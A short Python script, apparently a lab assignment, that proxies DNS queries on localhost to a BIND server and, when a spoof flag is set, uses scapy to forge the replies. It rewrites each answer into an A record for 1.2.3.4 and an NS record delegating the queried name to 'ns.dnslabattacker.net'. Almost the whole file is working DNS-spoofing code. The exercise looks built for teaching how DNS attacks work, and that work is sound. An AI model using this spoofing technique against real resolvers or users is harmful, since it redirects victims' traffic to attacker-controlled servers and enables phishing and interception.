#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

localhost = "127.0.0.1"
# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind((localhost, port))

def proxy_server(data, ip_addr, port_num):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(1)
    client.sendto(data, (localhost, dns_port))

    while True:
        try:
            data_received = client.recvfrom(4096)[0]
        except:
            break

        if not data_received:
            break

        dns_packet = DNS(data_received)

        if SPOOF:
            dns_packet[DNS].an = DNSRR(type = 'A', rrname = dns_packet[DNSQR].qname, rdata = "1.2.3.4")
            dns_packet[DNS].ancount = 1
            dns_packet[DNS].ns = DNSRR(type = 'NS', rrname = dns_packet[DNSQR].qname, rdata = "ns.dnslabattacker.net")
            dns_packet[DNS].nscount = 1
            dns_packet[DNS].arcount = 0

        num_bytes = bytes(dns_packet)
        server.sendto(num_bytes, (ip_addr, port_num))
    client.close()


while True:
    while True:
        data, (ip_addr, port_num) = server.recvfrom(4096)
        if data:
            proxy_server(data, ip_addr, port_num)
        else:
            break
    server.close()